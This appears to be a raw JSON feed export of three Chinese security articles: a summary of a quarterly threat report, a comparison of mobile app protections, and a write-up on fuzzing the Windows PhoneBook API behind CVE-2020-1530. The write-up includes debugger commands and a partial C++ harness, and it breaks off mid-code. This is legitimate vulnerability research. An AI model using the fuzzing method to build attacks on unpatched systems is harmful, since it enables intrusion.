{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-08-25 18:01:51","updatedTime":"2020-08-25 18:01:51","title":"网络攻击沾上浓重“新冠”气息  勒索与挖矿病毒活跃度不减","link":"https://www.4hou.com/posts/Np6z","description":"<p style=\"font-size: medium;white-space: normal\"><span style=\"text-align: justify; font-family: 微软雅黑, sans-serif; color: windowtext;\">2020年第二季度，</span><span style=\"text-align: justify; font-family: 微软雅黑, sans-serif; color: windowtext;\">虽然</span><span style=\"text-align: justify; font-family: 微软雅黑, sans-serif; color: windowtext;\">新冠疫情在国内的防控形势已经由阴转晴，</span><span style=\"text-align: justify; font-family: 微软雅黑, sans-serif; color: windowtext;\">但在全球依然呈现爆发趋势，并给网络安全领域带来了深远的影响。亚信安全最近发布的《2020&#160;年第二季度网络安全威胁报告》显示，由于疫情下远程办公的普及，越来越多的网络犯罪分子瞄准视频应用程序传播恶意软件；而在新冠病毒防控常态化的同时，“新冠研究与调查”更成为社交工程攻击的热门“诱饵”，带来更为严峻的安全威胁。亚信安全建议，企业用户要培训员工提高警惕，谨防海外不法攻击借助“新冠”侵入网络，并部署周全的网络安全解决方案。</span><br/></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">&#160;</span><strong><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">“跨越”物理界限 新冠影响数字世界</span></strong></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">提起病毒，我们往往会想到两种事物，一种是生物意义上的病毒，另外一种则是计算机病毒。在平时，两者泾渭分明，但在新冠这种特大型人类灾难面前，我们可以清晰的看到现实世界和数字世界是如何相互交织的：亚信安全发现，在第二季度，由于新冠在全球的快速爆发，以新冠为攻击肇因与诱饵的网络攻击事件快速增长。</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">&#160;</span><span style=\"color: windowtext; font-family: 微软雅黑, sans-serif;\">针对视频应用的攻击是最明显的例子：远程办公中，视频会议应用程序成为不可缺少的软件之一。网络不法分子也瞄准了这一机会，除了对视频会议应用程序进行攻击之外，还会将挖矿病毒与&#160;Zoom&#160;等视频会议应用程序捆绑，一旦用户安装这类软件，后台就会悄悄下载恶意挖矿病毒。&#160;</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">&#160;</span><span style=\"color: windowtext; font-family: 微软雅黑, sans-serif;\">此外，报告还显示，越来越多的不法分子抓住人们对于新冠病毒研究与调查的关注，利用热点话题发动“钓鱼”攻击。在本季度，亚信安全截获了&#160;LemonDuck&#160;无文件挖矿病毒，该病毒能够绕过老版本的防护措施，伪装成“新冠病毒”相关邮件，诱导收件人点击邮件附件，导致感染并继续传播病毒。除了挖矿病毒外，本季度还截获了利用“新冠疫情”蹭热点的新型&#160;Unicorn&#160;勒索病毒，为了掩人耳目，此病毒还会在攻击成功后弹出“新冠疫情”&#160;相关信息图片。</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598348960723939.png\" title=\"1598348960723939.png\" alt=\"图片 1.png\"/></span></p><p style=\"font-size: medium;white-space: normal;text-align: center\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">【勒索病毒中携带的新冠疫情相关图片】</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">&#160;</span><span style=\"color: windowtext; font-family: 微软雅黑, sans-serif;\">通过对近期攻击事件的分析，亚信安全指出，新冠是&#160;2020&#160;年对世界影响最大的事件，同样也深度改变了数字世界，影响了网络攻防的“战场”，网络不法分子更多的利用了新冠带来的热度，来制造社交工程“诱饵”。对于国内用户来说，虽然与新冠有关的直接网络攻击有所降低，但我们仍然要防范这些风险的死灰复燃，并及时采取相应防范措施。</span><span style=\"color: windowtext; font-family: 微软雅黑, sans-serif;\">&#160;</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><strong><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">勒索病毒与挖矿病毒依然肆虐</span></strong></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">勒索病毒与挖矿病毒可以说是“老熟人”了，各类安全事件一直不乏他们活跃的身影：在第二季度，亚信安全共拦截挖矿病毒&#160;7,963&#160;次，其月检测量呈递增趋势，不仅老病毒出现频繁更新，而且还出现了多个新型挖矿病毒。这其中包括通过&#160;WMI&#160;无文件挖矿实现双平台感染的病毒，利用“新冠病毒”邮件传播的&#160;LemonDuck&#160;无文件挖矿病毒，以及借助“海啸”僵尸网络发动DDoS&#160;攻击的挖矿病毒。</span></p><p style=\"font-size: medium;white-space: normal;text-align: center\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598348975186870.png\" title=\"1598348975186870.png\" alt=\"2.png\"/><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">【亚信安全挖矿病毒检测数量图】</span></p><p style=\"font-size: medium; white-space: normal; text-align: justify;\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">&#160;</span><span style=\"color: windowtext; font-family: 微软雅黑, sans-serif; text-align: justify;\">勒索病毒在本季度也衍生出大量的变种，包括&#160;GlobeImposter、WannaRen、Sodinokibi勒索病毒的全新变种都频繁出现，这些变种为了锁住目标主机，勒索赎金，穷尽所能绕过网络安全软件的封堵。其中，本季度的热门勒索病毒&#160;GlobeImposter&#160;的最新变种&#160;C4H&#160;通常会利用&#160;RDP/SMB&#160;暴力破解在内网扩散并投放，在进入内网后通过多种方法获取登录凭证，并在内网横向渗透传播。</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">&#160;</span><span style=\"color: windowtext; font-family: 微软雅黑, sans-serif;\">目前，亚信安全防病毒服务器（OSCE）的行为监控功能已经可以有效拦截上述病毒，亚信安全高级威胁发现系统&#160;TDA&#160;则可以准确定位到下载恶意病毒的主机，阻止其后续的横向渗透行为。亚信安全认为，阻止这些病毒传播的第一道关口往往是邮件、网页、社交软件，用户要养成良好的网络安全习惯，不要随意打开安全性不明的邮件或是网站。此外，企业用户最好能够通过访问控制策略，限制外部对于关键业务数据的访问，通过补丁管理、安全准入等机制，尽可能降低漏洞攻击风险。</span></p><p style=\"font-size: medium;white-space: normal;text-align: justify\"><strong><span style=\"font-family: 微软雅黑, sans-serif;color: rgb(192, 0, 0)\">除此之外，亚信安全第二季度安全报告还揭示了以下动态：</span></strong></p><ul class=\" list-paddingleft-2\" style=\"list-style-type: disc;\"><li><p>REMCOS&#160;远控木马、LokiBot&#160;间谍木马和&#160;EMOTET&#160;银行木马等著名木马家族在本季度再度活跃，并给金融机构带来巨大威胁。</p></li><li><p>PE&#160;病毒数量在所有检测病毒类型中所占比重最大，占到总检测数量的&#160;26%，其检测数量达到&#160;5,734,382&#160;次。在具体病毒检测排名中，检测数量排名第一的则是&#160;EXPL_CPLNK.SM。</p></li><li><p>截止到本季度，亚信安全对于安卓&#160;APK&#160;处理数量累计达到&#160;10,170&#160;万个，保持了月处理数量持续上升的趋势。</p></li><li><p>本季度通过&#160;WEB&#160;传播的恶意程序中，.EXE&#160;类型的可执行文件占总数的&#160;83%，居首位。与上季度相比，略有减少。</p></li><li><p>本季度所有钓鱼网站中，“金融证券类”钓鱼网站所占比例最多，占总数的99%以上。</p></li></ul><p><br/></p><p style=\"font-size: medium; white-space: normal; text-align: justify;\"><strong><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">报告下载链接</span></strong><span style=\"font-family: 微软雅黑, sans-serif;color: windowtext\">：</span><span style=\"font-family: &#39;Helvetica Neue&#39;;color: windowtext\"><span style=\"font-size: 17px;color: rgb(17, 142, 255)\"><a href=\"https://www.asiainfo-sec.com/security/threaten/12220.html\">https://www.asiainfo-sec.com/security/threaten/12220.html</a></span></span></p>","descriptionType":"text/html","publishedDate":"Tue, 25 Aug 2020 09:50:12 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598348960723939.png","linkMd5":"ba9067a4276b40f16809017742c71a1c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn19@2020_2/2020/08/25/10-01-58-456_184ba4a6608c1cc9.webp","destWidth":926,"destHeight":544,"sourceBytes":382667,"destBytes":35194,"author":"高坂穗乃果","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598348960723939.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn19@2020_2/2020/08/25/10-01-58-456_184ba4a6608c1cc9.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598348975186870.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn48@2020_1/2020/08/25/10-02-01-239_e14f33855bbbcad9.webp"},"publishedOrCreatedDate":1598349711551},{"createdTime":"2020-08-25 18:01:51","updatedTime":"2020-08-25 18:01:51","title":"应用程序屏蔽和应用程序内保护，哪个能更好的保护你的程序安全？","link":"https://www.4hou.com/posts/nNnR","description":"<p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200412/1586663929484458.png\" title=\"1586663929484458.png\" alt=\"微信截图_20200412115810.png\"/></p><p style=\"text-align: left;\">众所周知，攻击者往往会使用用户移动设备上运行的应用程序来攻击后端的系统，比如攻击者利用移动操作系统和你的应用程序中的漏洞来监视你，获取私人数据甚至窃取资金。为了应对这种情况，许多移动应用程序开发人员正在使用应用程序屏蔽，有时称为“应用程序强化（app hardening）”来缓解攻击者对应用程序发起的各种攻击。</p><p style=\"text-align: left;\">应用程序强化或应用程序屏蔽对于防止逆向工程很重要，但该方法不会在你的应用程序运行在一个危险的移动设备的环境中检测到实时的网络攻击。移动应用程序需要额外的应用程序内保护，以保护你的应用程序免受攻击和欺诈。</p><p style=\"text-align: left;\">研究者在2019年7月发布了一份 “应用程序内保护市场指南”，所谓应用程序内保护是指在应用程序（而不是网络或操作系统）中实施的安全解决方案，这样应用程序更能抵御恶意数据泄露、入侵、篡改和逆向工程等攻击。企业使用应用程序内保护来保护其基于软件的资产，并保护其组织和客户免受欺诈性攻击。</p><p style=\"text-align: left;\">包含个人身份信息和知识产权的金融、医疗保健和公民服务应用程序应同时实现应用程序屏蔽和应用程序内保护。在本文，我将描述每种情况，并提供示例应用程序来实现应用程序内保护以及它们所保护的数据。</p><p style=\"text-align: left;\"><span style=\"font-size: 20px;\"><strong>什么是应用程序屏蔽？</strong></span></p><p style=\"text-align: left;\">应用程序屏蔽是一组用于修改和混淆应用程序的二进制代码的技术。应用程序防护使应用程序更具防篡改性，可以防止通过逆向工程和未经授权的访问来窃取机密。它创建了一个更具弹性的应用程序，通过混淆和加密二进制代码使逆向工程更加困难。</p><p style=\"text-align: left;\">应用程序屏蔽功能包括：</p><p style=\"text-align: left;\">1. 代码混淆，混淆是修改人类难以理解的源代码或设备代码的蓄意行为。使代码难以理解会阻止攻击者试图从你的代码中挖掘潜在的缺陷、漏洞或对IP进行逆向工程。</p><p style=\"text-align: left;\">2. 调试检测，应用程序阻止和检测调试，并响应当前的调试器，必须涵盖所有可用的调试协议。</p><p style=\"text-align: left;\">3. 模拟器检测，模拟器检测使应用程序能够检测它在模拟器中的操作。模拟器用于对应用程序进行逆向工程，并识别其与其他服务的通信。</p><p style=\"text-align: left;\">4. 根或越狱检测，越狱或根检测会检测用户是否删除了苹果或谷歌在设备上设置的限制。越狱检测很重要，但不能检测到设备受到攻击。</p><p style=\"text-align: left;\">5. 应用篡改，尽管混淆有助于防止对静态（非运行）代码进行逆向工程，但攻击者仍然可以通过在运行时“钩住”应用来尝试逆向应用。应用程序篡改包括检测攻击者是否尝试对应用程序进行逆向工程。</p><p style=\"text-align: left;\"><span style=\"font-size: 20px;\"><strong>什么是应用程序内保护？</strong></span></p><p style=\"text-align: left;\">应用程序内保护与应用程序屏蔽不同，它可以从应用程序内部检测实时恶意软件，网络和操作系统攻击。移动威胁防御技术被置于移动应用程序内部，以检测和补救对应用程序和设备的威胁。</p><p style=\"text-align: left;\">应用程序内保护可保护后端系统免受可能携带的移动恶意软件或易受攻击的移动设备的攻击。虽然我们无法控制移动设备上应用的安全状况，但是如果在移动设备上检测到恶意软件，危险的配置或网络攻击，则可以限制设备与受攻击的程序进行通信。</p><p style=\"text-align: left;\">除了越狱和仿真器检测之外，一些数据应用程序内保护还提供：</p><p style=\"text-align: left;\">1. 恶意软件检测，应用程序内保护可检测设备上的多种恶意软件，并建议用户进行补救。随着用户继续迁移到移动设备，恶意软件也会迁移。 Bankbot，Monokle，Anubis和Cerebus等恶意软件样本和远程访问工具RAT已出现在移动设备上，随着越来越多的公司将更多服务推向移动设备，这种趋势还将继续。其中许多RAT会监控剪贴板、密码，以收集有关用户和凭据数据。</p><p style=\"text-align: left;\">2. 零日检测，应用程序内保护可检测通过文件系统和操作系统行为利用的漏洞。通过动态监控危害指标与查看已知漏洞的云库，或仅检测设备上安装的OS版本/补丁程序级别的指标，就可以检测到零日攻击。</p><p style=\"text-align: left;\">3. 网络或Wi-Fi缓解，应用程序内保护检测网络连接操作和中间人(MiTM)攻击。你的应用程序应该能够识别“中间人”(MiTM)、SSL剥离，并尝试代理或解密你的用户的应用程序流量，以纠正攻击和产生有关威胁事件的威胁取证。</p><p style=\"text-align: left;\">4. 设备配置风险，这个风险主要来自用户自己。用户选择是否更新操作系统以修补已知漏洞，使用PIN码或越狱设备。应用程序内部的应用程序内保护可让你查看应用的安全状况，并最终了解移动应用程序的风险状况。</p><p style=\"text-align: left;\"><span style=\"font-size: 20px;\"><strong>应用程序屏蔽和应用程序内保护有什么区别？</strong></span></p><p style=\"text-align: left;\">应用程序屏蔽和应用程序内保护是互补的，在许多情况下，为了全面降低风险，用户应该在移动应用程序中同时使用这两种技术来增强预防能力并阻止攻击者获取更多隐私数据。至于你决定使用哪一种方法来保护，则取决于你的应用程序的运行方式，以及它定期存储和处理的信息类型。</p><p style=\"text-align: left;\">为了达到最优的安全水平，移动开发团队投入大量时间来设计和构建直观的移动应用程序。这样的程序会自动执行标准的安全检查，并尝试遵循良好的编码习惯。但是，在运行时保护应用程序的安全也至关重要。因为移动应用程序是依赖操作系统来提供安全运行的基础，所以如果设备受到威胁，那么移动应用程序的整个安全基础也会受到威胁。</p><p style=\"text-align: left;\">一个自我保护的应用程序可以不依赖设备本身的安全性能来安全的运行和操作，具有运行时安全技术或应用程序内保护的移动应用程序能够独立于本机安全功能检测恶意活动。这种独立检测可及时识别野外的威胁，并最终避免不可接受的风险暴露，并最终保护应用程序和服务器端的交易和数据。</p><p style=\"text-align: left;\"><span style=\"font-size: 20px;\"><strong>设备本身的操作系统有多脆弱？</strong></span></p><p style=\"text-align: left;\">移动应用程序开发人员依靠底层操作系统来确保安全性，但是，尽管移动操作系统本身已经加强了防御攻击的能力，但它们并非万无一失。众所周知，研究人员每年都会发现成千上万的新漏洞。事实也是，研究人员和恶意攻击者都在不断测试Android和iOS，以通过漏洞赏金计划、内部研究或将零日价格卖给出价最高的人来寻找漏洞。目前，一个在iOS上远程传输的持续性漏洞可以卖到200万美元。</p><p style=\"text-align: left;\">2019年，移动操作系统供应商为1161个安全漏洞创建了补丁。而苹果则修复了306个CVE (即常见的漏洞和暴露)，其中64%被认为是“严重”安全威胁。</p><p style=\"text-align: left;\">Google在2019年修补了855个CVE，其中大多数（54％）被认为是“严重”或“高”安全威胁。严重CVE是一类允许远程执行代码或远程绕过安全功能的漏洞，如果严重CVE成功执行，则攻击者就可以远程访问数据或绕过操作系统安全保护，进而发起各种功能。</p><p style=\"text-align: left;\">即使所有漏洞的补丁都在规定的时间内交付，用户也必须升级他们的设备以提高安全性。但如果依靠用户来打补丁，则是一场安全赌博。因为许多设备太旧了，无法再升级。</p><p style=\"text-align: left;\"><span style=\"font-size: 20px;\"><strong>为什么需要实施OWASP？</strong></span></p><p style=\"text-align: left;\">开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个组织，它提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息。其目的是协助个人、企业和机构来发现和使用可信赖软件。</p><p style=\"text-align: left;\">如果你正在遵循OWASP Mobile Top 10，那么你很可能已经实现了应用程序屏蔽以及强化过程和工具。OWASP建议你实现用于身份验证、数据存储、加密和逆向工程的控件。然而，在移动安全和应用强化方面，还存在很大的改进空间。</p><p style=\"text-align: left;\">Zimperium（Zimperium成立于 2010 年，由著名黑客 Zuk Avraham 创立，旨在为手机提供解决方案，以防受网络攻击。）此前曾对来自银行、旅游和零售行业的应用程序进行过安全、隐私和监管方面的OWASP Mobile Top 10进行了审查。他们发现大多数应用程序没有通过逆向工程检查。逆向工程应用程序可以使攻击者发现漏洞和通信方法。未能正确实施安全强化并通过移动应用程序暴露漏洞的最著名例子之一是乐购银行(&#160;Tesco&#160;Bank&#160;)。2016年英国零售业龙头特易购旗下的银行事业Tesco Bank传出遭骇客攻击，有超过4万个帐户遭锁定、2万个帐户被成功骇入，用户存款遭到盗领。这起英国有史以来最严重的网路窃盗事件，导致Tesco Bank共13.6万个帐户中的4万个遭到骇客锁定攻击，2万个被成功盗走存款。经查，是Tesco Bank的移动应用程序存在漏洞，这为网络攻击者强行进入银行盗取存款打开了大门。然而，许多受影响的账户并不是移动银行客户，而是从一个安全性很差的移动应用程序发起的攻击。</p><p style=\"text-align: left;\">另外，移动应用的开发人员可能还需要实施应用程序内保护，以符合特定的法规和政策。 PSD2要求移动应用程序开发人员能够检测第三方操作并实现独立的身份验证环境，另外，GDPR和《加州消费者隐私法案》还强制程序要执行数据隐私和删除私人数据的功能。 另外，PCI DSS和HIPAA等其他规定的颁布，也旨在减少支付和医疗保健行业的攻击行为。全称Payment Card Industry (PCI) Data Security Standard,第三方支付行业(支付卡行业PCI DSS)数据安全标准，是由PCI安全标准委员会的创始成员(visa、mastercard、American Express、Discover Financial Services、JCB等)制定，立在使国际上采用一致的数据安全措施，简称PCI DSS。HIPAA全称为：Health Insurance Portability and Accountability Act/1996，Public Law 104-191，尚没有确切的正式中文名称，国内文献一般直接称为HIPAA法案，有的称为健康保险携带和责任法案，也有取其意为医疗电子交换法案；台湾有文献翻译为义务型可携带式健康保险法案。</p><p style=\"text-align: left;\"><span style=\"font-size: 20px;\"><strong>在移动应用程序中安装应用程序内保护的具体案例</strong></span></p><p style=\"text-align: left;\">近日，一家全球银行承认，它拥有数百万个客户和数十万名员工，通过五十种不同的企业和用户移动应用程序连接到其后端系统。该银行的IT员工意识到无法确定与银行系统交互的客户或员工设备的安全运行状况，该银行发现有必要了解与移动设备与其系统交互相关的风险。</p><p style=\"text-align: left;\">然后，这家美国银行进行了详尽的搜索，并测试了所有可用的移动安全解决方案。团队一致选择应用程序内保护方案来保护其员工设备、消费者银行业务和内部员工移动应用程序的安全。</p><p style=\"text-align: left;\">该银行计划将移动安全防御系统嵌入其消费者移动银行应用程序中。通过将威胁防御部署到其移动银行应用程序，该银行现在可以识别在受损或有风险的设备上进行的可疑交易。</p><p style=\"text-align: left;\">在部署之前，银行缺乏来自客户设备的安全数据。在部署后，这些安全数据就会很容易获得。</p><p style=\"text-align: left;\">应用程序更新后，用户立即开始使用受网络保护的应用程序进行移动银行交易。安全人员发现，用户的移动设备及其连接的网络的安全状况令人震惊。</p><p style=\"text-align: left;\">在头30天里，该银行记录了近100万起针对客户移动设备的威胁，只有在银行应用程序打开时才会记录威胁数据。如果该应用程序被关闭，银行不会收到来自用户的威胁数据，因为其他应用程序中的会话不会对银行构成欺诈风险。</p><p style=\"text-align: left;\">在最初的30天内，数百万移动银行用户更新了应用程序，并开始对移动攻击的行为进行数据取证：</p><p style=\"text-align: left;\">1. 276000次不安全的Wi-Fi检测；</p><p style=\"text-align: left;\">2. 1433个恶意接入点检测；</p><p style=\"text-align: left;\">3. 495000台设备没有PIN码；</p><p style=\"text-align: left;\">4. 启用了166000个第三方应用商店访问权限；</p><p style=\"text-align: left;\">5. 16000个根或越狱的设备；</p><p style=\"text-align: left;\">6. 1000个记录了系统或文件篡改的事件；</p><p style=\"text-align: left;\">7. 用户的智能手机上有1500个根应用和另外500个包含恶意软件、特洛伊木马和间谍软件的应用。</p><p style=\"text-align: left;\">目前，该银行已掌握了如何通过移动渠道防范欺诈的可操作数据，涉及金额超过11亿美元。所有这些都是通过使用移动威胁防御SDK更新现有的应用程序来实现的，该SDK的配置时间不到10分钟。</p>","descriptionType":"text/html","publishedDate":"Tue, 25 Aug 2020 04:36:03 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200412/1586663929484458.png","linkMd5":"4df24128064db5f6005bb3a2f7b1961c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn36@2020_6/2020/08/25/10-01-55-363_95973d7d1cab190f.webp","destWidth":751,"destHeight":303,"sourceBytes":178270,"destBytes":16532,"author":"xiaohui","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200412/1586663929484458.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn36@2020_6/2020/08/25/10-01-55-363_95973d7d1cab190f.webp"},"publishedOrCreatedDate":1598349711577},{"createdTime":"2020-08-25 18:01:51","updatedTime":"2020-08-25 18:01:51","title":"Windows PhoneBook释放后使用漏洞的发现过程与分析（CVE-2020-1530）","link":"https://www.4hou.com/posts/Ggr7","description":"<p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597729942246461.png\" title=\"1597729942246461.png\" alt=\"1.png\"/></p><p><span style=\"font-size: 20px;\"><strong>0x00 前言</strong></span></p><p>早在今年4月，我就开始浏览MSDN，主要是探索一种不太常见的文件格式，这种文件格式此前并没有经过混淆，在每个现代的Windows版本上都是可用的，因此我觉得可能有机会在其中寻找到漏洞。在进行了数个小时的尝试后，我发现了RasEnumEntriesA这个API：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597729955440323.png\" title=\"1597729955440323.png\" alt=\"2.png\"/></p><p>那么，什么是PhoneBook（pbk）文件呢？</p><p>在这里，我们可以查到：</p><p>“通讯簿（PhoneBook）提供了一种标准方式来收集和指定远程访问连接管理（Remote Access Connection Manager）建立远程连接所需的信息。通讯簿将条目名称与电话号码、COM端口、调制解调器设置等信息相关联。每个通讯簿条目均包含建立RAS连接所需的信息。通讯簿存储在通讯簿文件中，通讯簿文件是包含条目名称和相关信息的文本文件。RAS创建一个名为RASPHONE.PBK的通讯簿文件。用户可以使用‘拨号网络’对话框来创建个人通讯簿文件。RAS API当前不支持创建通讯簿文件。某些RAS函数（例如RasDial函数）具有指定通讯簿文件的参数。如果调用者未指定通讯簿文件，则该函数使用默认通讯簿文件，这个文件是用户在‘拨号网络’对话框的‘用户首选项’属性表中选择的文件。”</p><p>这正是我想要的！</p><p>在本文中，我们将深入研究Windows PhoneBook API，并继续查找样本、创建工具、检查覆盖率、对API进行模糊处理，以寻找漏洞。</p><p><span style=\"font-size: 20px;\"><strong>0x01 获取示例</strong></span></p><p>由于我对通讯簿文件格式完全不熟悉，因此通过快速搜索，找到了一些示例文件格式：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597729973446777.png\" title=\"1597729973446777.png\" alt=\"3.png\"/></p><p>示例文件格式如下所示：</p><pre class=\"brush:html;toolbar:false\">[SKU]\nEncoding=1\nPBVersion=4\nType=2\nAutoLogon=0\nUseRasCredentials=1\nLowDateTime=688779312\nHighDateTime=30679678\nDialParamsUID=751792375\n--&#160;snip&#160;--\nAuthRestrictions=512\nIpPrioritizeRemote=1\nIpInterfaceMetric=0\nIpHeaderCompression=0\nIpAddress=0.0.0.0\nIpDnsAddress=0.0.0.0\nIpDns2Address=0.0.0.0\nIpWinsAddress=0.0.0.0\nIpWins2Address=0.0.0.0\n&#160;\nNETCOMPONENTS=\nms_msclient=1\nms_server=1\n&#160;\nMEDIA=rastapi\nPort=VPN1-0\nDevice=WAN&#160;Miniport&#160;(PPTP)\n&#160;\nDEVICE=vpn\nPhoneNumber=vpn.sku.ac.ir\nAreaCode=\nCountryCode=0\nCountryID=0\nUseDialingRules=0\nComment=\nFriendlyName=\nLastSelectedPhone=0\nPromoteAlternates=0\nTryNextAlternateOnFail=1</pre><p><span style=\"font-size: 20px;\"><strong>0x02 寻找攻击面</strong></span></p><p>接下来，我迅速获取了一些示例，并进行了实验。事实证明，Windows已经附带了位于system32目录下的可执行文件rasphone.exe，该可执行文件还提供了许多值得关注的参数，这些参数及其说明列举如下：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730012408042.png\" title=\"1597730012408042.png\" alt=\"4.png\"/></p><p>现在，下一步是确保我们确实使用了RasEnumEntries函数。可以选择使用一些Windows API监视工具，但在这里，我是用的是经典的WinDbg方法，仅设置一个断点：</p><pre class=\"brush:html;toolbar:false\">0:000&#62;&#160;bp&#160;RASAPI32!RasEnumEntriesA\n0:000&#62;&#160;bp&#160;RASAPI32!RasEnumEntriesW</pre><p>不知道大家有没有注意到，在页面的最下方，有一个注释：</p><p>“ras.h标头将RasEnumEntries定义为别名，这个别名将根据UNICODE预处理程序常量的定义，自动选择这个函数的ANSI或Unicode版本。如果将中性编码（Encoding-neutral）的别名用法与非中性编码的代码混合，可能会导致不匹配，从而导致编译或运行时出错。有关这部分的更多信息，可以参考函数原型约束。”</p><p>简而言之，与使用宽字符串（Unicode）的RasEnumEntriesW相比，RasEnumEntriesA使用ANSI版本。</p><p>通过运行windbg.exe rasphone.exe -f sample.pbk加载文件后，我们可以观察到以下内容：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730023837775.png\" title=\"1597730023837775.png\" alt=\"5.png\"/></p><p>查看栈回溯，很明显发现rasphone二进制文件调用了RASDLG API（对RASAPI32 API进行的对话框包装），然后最终到达了目标（RasEnumEntriesW）。目前，一切顺利。</p><p><span style=\"font-size: 20px;\"><strong>0x03 构建工具</strong></span></p><p>这一章是本文最重点的部分，如果大家关注过@gamozolabs的视频，就会了解到模糊测试无非是在构建合适的工具并探索正确的代码路径而已。那我们从哪里开始呢？幸运的是，在以前指向RasEnumEntries文档的链接中，Microsoft提供了一个不错的示例文档。通过阅读示例代码，我们发现需要调用两次RasEnumEntries函数，第一次获取所需的缓冲区大小，第二次使用正确的参数执行真正的调用。在示例中，还缺少一个非常重要的参数，RasEnumEntries函数的第二个参数为NULL，因此这些条目是从All Users配置文件和用户配置文件中所有可以远程访问的通讯簿文件中枚举的。我们来调整一下：</p><pre class=\"brush:html;toolbar:false\">//&#160;RasEntries.cpp&#160;:&#160;This&#160;file&#160;contains&#160;the&#160;&#39;main&#39;&#160;function.&#160;Program&#160;execution&#160;begins&#160;and&#160;ends&#160;there.\n//\n&#160;\n#include&#160;&#60;&#160;iostream&#160;&#62;\n#include&#160;&#60;&#160;windows.h&#160;&#62;\n#include&#160;&#60;&#160;stdio.h&#160;&#62;\n#include&#160;&#34;ras.h&#34;\n#include&#160;&#34;raserror.h&#34;\n#pragma&#160;comment(lib,&#160;&#34;rasapi32.lib&#34;)\n&#160;\n&#160;\nint&#160;main(int&#160;argc,&#160;char**&#160;argv)\n{\n&#160;&#160;&#160;&#160;DWORD&#160;dwCb&#160;=&#160;0;\n&#160;&#160;&#160;&#160;DWORD&#160;dwRet&#160;=&#160;ERROR_SUCCESS;\n&#160;&#160;&#160;&#160;DWORD&#160;dwErr&#160;=&#160;ERROR_SUCCESS;\n&#160;&#160;&#160;&#160;DWORD&#160;dwEntries&#160;=&#160;0;\n&#160;&#160;&#160;&#160;LPRASENTRYNAME&#160;lpRasEntryName&#160;=&#160;NULL;\n&#160;&#160;&#160;&#160;DWORD&#160;rc;\n&#160;&#160;&#160;&#160;DWORD&#160;dwSize&#160;=&#160;0;\n&#160;&#160;&#160;&#160;LPCSTR&#160;lpszPhonebook&#160;=&#160;argv[1];\n&#160;&#160;&#160;&#160;DWORD&#160;dwRasEntryInfoSize&#160;=&#160;0;\n&#160;\n&#160;&#160;&#160;&#160;RASENTRY*&#160;RasEntry&#160;=&#160;NULL;&#160;&#160;&#160;&#160;&#160;&#160;//&#160;Ras&#160;Entry&#160;structure\n&#160;&#160;&#160;&#160;BOOL&#160;bResult&#160;=&#160;TRUE;&#160;&#160;&#160;&#160;//&#160;return&#160;for&#160;the&#160;function\n&#160;&#160;&#160;&#160;RasEntry&#160;=&#160;(RASENTRY*)HeapAlloc(GetProcessHeap(),&#160;HEAP_ZERO_MEMORY,\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sizeof(RASENTRY));\n&#160;\n&#160;&#160;&#160;&#160;printf(&#34;main:&#160;%p\\n&#34;,&#160;(void*)main);\n&#160;\n&#160;&#160;&#160;&#160;if&#160;(argc&#160;&#60;&#160;2)&#160;{\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;printf(&#34;Usage:&#160;%s&#160;&#60;&#160;bpk&#160;file&#160;&#62;&#160;\\n&#34;,&#160;argv[0]);\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;return&#160;0;\n&#160;&#160;&#160;&#160;}\n&#160;\n&#160;&#160;&#160;&#160;//&#160;Call&#160;RasEnumEntries&#160;with&#160;lpRasEntryName&#160;=&#160;NULL.&#160;dwCb&#160;is&#160